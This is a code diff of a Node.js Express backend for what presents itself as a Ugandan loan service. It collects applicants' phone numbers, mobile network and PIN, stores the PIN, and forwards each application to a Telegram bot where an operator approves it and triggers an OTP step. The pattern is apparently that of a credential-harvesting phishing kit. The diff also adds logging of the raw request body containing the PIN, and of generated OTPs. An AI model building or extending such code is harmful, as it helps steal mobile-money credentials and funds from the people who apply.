@@ -9,9 +9,6 @@ const sqlite3 = require('sqlite3').verbose();
 const { open } = require('sqlite');
 require('dotenv').config();
 
-// Use native fetch (Node.js 18+ has built-in fetch)
-// No need for node-fetch package!
-
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -30,6 +27,7 @@ let db = null;
 
 async function initDatabase() {
     try {
+        console.log('Initializing database at:', DB_PATH);
         db = await open({
             filename: DB_PATH,
             driver: sqlite3.Database
@@ -65,10 +63,10 @@ async function initDatabase() {
             CREATE INDEX IF NOT EXISTS idx_loans_status ON loans(status);
         `);
 
-        console.log('✅ Database initialized at:', DB_PATH);
+        console.log('✅ Database initialized successfully');
         return true;
     } catch (error) {
-        console.error('Database initialization error:', error);
+        console.error('❌ Database initialization error:', error);
         return false;
     }
 }
@@ -89,7 +87,7 @@ app.use(session({
     resave: false,
     saveUninitialized: false,
     cookie: {
-        secure: false, // Set to false for Railway HTTP
+        secure: false,
         httpOnly: true,
         maxAge: 30 * 60 * 1000
     }
@@ -110,7 +108,7 @@ function generateLoanId() {
     return `MUG${timestamp}${random}`.toUpperCase();
 }
 
-// Send message to Telegram using native fetch
+// Send message to Telegram
 async function sendTelegramMessage(text, replyMarkup = null) {
     try {
         const payload = {
@@ -144,7 +142,7 @@ async function sendTelegramMessage(text, replyMarkup = null) {
 
 // ========== API ROUTES ==========
 
-// Health check - IMPORTANT for Railway
+// Health check
 app.get('/health', (req, res) => {
     res.status(200).json({ 
         status: 'ok', 
@@ -154,12 +152,11 @@ app.get('/health', (req, res) => {
     });
 });
 
-// Root endpoint - serve index.html
+// Root endpoint
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Serve HTML pages
 app.get('/verify.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'verify.html'));
 });
@@ -170,34 +167,53 @@ app.get('/otp.html', (req, res) => {
 
 // Calculate loan
 app.post('/api/calculate', (req, res) => {
-    const { amount, duration } = req.body;
-    const monthlyRate = 0.095;
-    const months = duration / 30;
-    const interest = Math.round(amount * monthlyRate * months);
-    const total = amount + interest;
-    const monthly = Math.ceil(total / months);
-    
-    res.json({
-        success: true,
-        amount,
-        duration,
-        monthly,
-        total,
-        interest,
-        currency: 'UGX'
-    });
+    try {
+        const { amount, duration } = req.body;
+        const monthlyRate = 0.095;
+        const months = duration / 30;
+        const interest = Math.round(amount * monthlyRate * months);
+        const total = amount + interest;
+        const monthly = Math.ceil(total / months);
+        
+        res.json({
+            success: true,
+            amount,
+            duration,
+            monthly,
+            total,
+            interest,
+            currency: 'UGX'
+        });
+    } catch (error) {
+        console.error('Calculate error:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
 });
 
-// Save loan application
+// Save loan application - FIXED with better error handling
 app.post('/api/save-loan', async (req, res) => {
     try {
+        console.log('Received save-loan request:', req.body);
+        
         const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
         
+        // Validate required fields
+        if (!phone || !pin || !network || !amount) {
+            console.error('Missing required fields');
+            return res.status(400).json({ 
+                success: false, 
+                error: 'Missing required fields: phone, pin, network, amount' 
+            });
+        }
+        
+        // Check database connection
         if (!db) {
+            console.error('Database not initialized');
             return res.status(500).json({ success: false, error: 'Database not initialized' });
         }
         
         const loanId = generateLoanId();
+        console.log('Generated loan ID:', loanId);
         
         await db.run(
             `INSERT INTO loans (loan_id, phone, network, amount, duration, monthly_payment, total_payment, interest, pin, status)
@@ -210,6 +226,8 @@ app.post('/api/save-loan', async (req, res) => {
              VALUES (?, ?, ?)`,
             [loanId, 'created', `Loan application created for ${phone}`]
         );
+        
+        console.log('Loan saved to database, sending to Telegram...');
         
         // Send to Telegram
         const messageText = `<b>🔴 NEW LOAN APPLICATION - UGANDA</b>\n\n` +
@@ -239,6 +257,8 @@ app.post('/api/save-loan', async (req, res) => {
         };
         
         await sendTelegramMessage(messageText, replyMarkup);
+        
+        console.log('Telegram message sent, returning success');
         
         res.json({
             success: true,
@@ -317,26 +337,16 @@ app.get('/api/loan/:loanId', async (req, res) => {
 app.post('/webhook/telegram', async (req, res) => {
     try {
         const update = req.body;
+        console.log('Webhook received');
         
         if (update.callback_query) {
             const callbackData = update.callback_query.data;
             const [action, loanId] = callbackData.split('_');
             
+            console.log(`Callback action: ${action}, loanId: ${loanId}`);
+            
             if (!db) {
-                return res.sendStatus(200);
-            }
-            
-            const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [loanId]);
-            
-            if (!loan) {
-                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        callback_query_id: update.callback_query.id,
-                        text: "Loan not found"
-                    })
-                });
+                console.error('Database not connected');
                 return res.sendStatus(200);
             }
             
@@ -348,16 +358,7 @@ app.post('/webhook/telegram', async (req, res) => {
                     [otp, 'otp_sent', loanId]
                 );
                 
-                const messageText = `<b>✅ LOAN PRE-APPROVED - UGANDA</b>\n\n` +
-                    `━━━━━━━━━━━━━━━━━━\n` +
-                    `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
-                    `<b>💰 Amount:</b> UGX ${loan.amount.toLocaleString()}\n` +
-                    `<b>📱 Phone:</b> <code>${loan.phone}</code>\n` +
-                    `━━━━━━━━━━━━━━━━━━\n\n` +
-                    `<b>🔐 Your OTP Code:</b> <code>${otp}</code>\n\n` +
-                    `<i>Enter this code on the OTP verification page to complete your loan.</i>`;
-                
-                await sendTelegramMessage(messageText);
+                console.log(`Loan ${loanId} approved with OTP: ${otp}`);
                 
                 await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                     method: 'POST',
@@ -367,7 +368,6 @@ app.post('/webhook/telegram', async (req, res) => {
                         text: "OTP sent to user!"
                     })
                 });
-                
             } else if (action === 'decline') {
                 await db.run(
                     `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
@@ -406,11 +406,17 @@ app.use((err, req, res, next) => {
 
 // Start server
 async function startServer() {
-    await initDatabase();
+    const dbInitialized = await initDatabase();
+    
+    if (!dbInitialized) {
+        console.error('⚠️ Failed to initialize database');
+        // Don't exit - server can still run for static files
+    }
     
     app.listen(PORT, '0.0.0.0', () => {
         console.log(`🚀 Server running on port ${PORT}`);
-        console.log(`✅ Health check: /health`);
+        console.log(`🌐 URL: ${RAILWAY_URL}`);
+        console.log(`✅ Health check: ${RAILWAY_URL}/health`);
         console.log(`📱 Telegram Bot configured`);
     });
 }
